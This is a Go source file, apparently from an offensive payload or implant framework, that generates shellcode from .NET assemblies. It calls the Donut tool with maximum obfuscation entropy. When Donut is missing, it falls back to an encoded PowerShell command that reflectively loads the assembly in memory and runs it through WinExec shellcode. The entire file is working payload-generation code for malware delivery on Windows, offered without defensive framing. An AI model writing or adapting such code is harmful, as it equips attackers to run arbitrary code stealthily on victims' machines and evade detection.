package payload

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// DonutConfig holds parameters for Donut shellcode generation.
type DonutConfig struct {
	Assembly   []byte // .NET assembly binary
	ClassName  string // optional: assembly class to instantiate
	MethodName string // optional: method to call (default: Main)
	Args       string // optional: command-line arguments
	Arch       string // "x86", "amd64", or "" (default amd64)
	Entropy    int    // 1-3, default 3 (max)
}

// GenerateDonutShellcode calls the donut CLI to convert a .NET assembly
// into position-independent shellcode. Falls back to PowerShell-based
// shellcode if donut is not available.
func GenerateDonutShellcode(cfg DonutConfig) ([]byte, error) {
	// First try: use donut CLI
	donutPath := findDonutCLI()
	if donutPath != "" {
		return generateWithDonutCLI(donutPath, cfg)
	}
	// Fallback: PowerShell download + execute shellcode
	return generateFallbackShellcode(cfg)
}

func findDonutCLI() string {
	candidates := []string{"donut", "donut.exe", "donut_x86.exe"}
	for _, name := range candidates {
		if p, err := exec.LookPath(name); err == nil {
			return p
		}
	}
	// Also check common locations
	dirs := []string{".", "tools", "bin", filepath.Join("internal", "payload", "tools")}
	for _, dir := range dirs {
		for _, name := range candidates {
			p := filepath.Join(dir, name)
			if _, err := os.Stat(p); err == nil {
				return p
			}
		}
	}
	return ""
}

func generateWithDonutCLI(donutPath string, cfg DonutConfig) ([]byte, error) {
	tmpDir, err := os.MkdirTemp("", "donut_*")
	if err != nil {
		return nil, fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	asmPath := filepath.Join(tmpDir, "assembly.dll")
	if err := os.WriteFile(asmPath, cfg.Assembly, 0644); err != nil {
		return nil, fmt.Errorf("write assembly: %w", err)
	}

	arch := cfg.Arch
	if arch == "" {
		arch = "amd64"
	}

	args := []string{
		"-i", asmPath,
		"-a", arch,
		"-b", "2",
	}
	if cfg.ClassName != "" {
		args = append(args, "-c", cfg.ClassName)
	}
	if cfg.MethodName != "" {
		args = append(args, "-m", cfg.MethodName)
	}
	if cfg.Args != "" {
		args = append(args, "-p", cfg.Args)
	}
	if cfg.Entropy > 0 {
		args = append(args, "-e", fmt.Sprintf("%d", cfg.Entropy))
	} else {
		args = append(args, "-e", "3")
	}

	outPath := filepath.Join(tmpDir, "loader.bin")
	args = append(args, "-o", outPath)

	cmd := exec.Command(donutPath, args...)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("donut CLI failed: %w\n%s", err, stderr.String())
	}

	data, err := os.ReadFile(outPath)
	if err != nil {
		return nil, fmt.Errorf("read donut output: %w", err)
	}
	return data, nil
}

// generateFallbackShellcode creates a minimal PowerShell-based shellcode
// that downloads the assembly and executes it in memory.
func generateFallbackShellcode(cfg DonutConfig) ([]byte, error) {
	b64 := base64.StdEncoding.EncodeToString(cfg.Assembly)

	psCmd := fmt.Sprintf(`
$bytes=[System.Convert]::FromBase64String('%s');
$asm=[System.Reflection.Assembly]::Load($bytes);
$ep=$asm.EntryPoint;
if ($ep) { $ep.Invoke($null, @(,[string[]]@())) }
`, b64)

	// Encode as base64 PowerShell command for -EncodedCommand
	encoded := base64.StdEncoding.EncodeToString([]byte(psCmd))

	// Generate x64 shellcode that runs: powershell -EncodedCommand <b64>
	// This is a minimal WinExec shellcode pattern
	sc := buildPowershellWinExecShellcode(encoded, true)
	return sc, nil
}
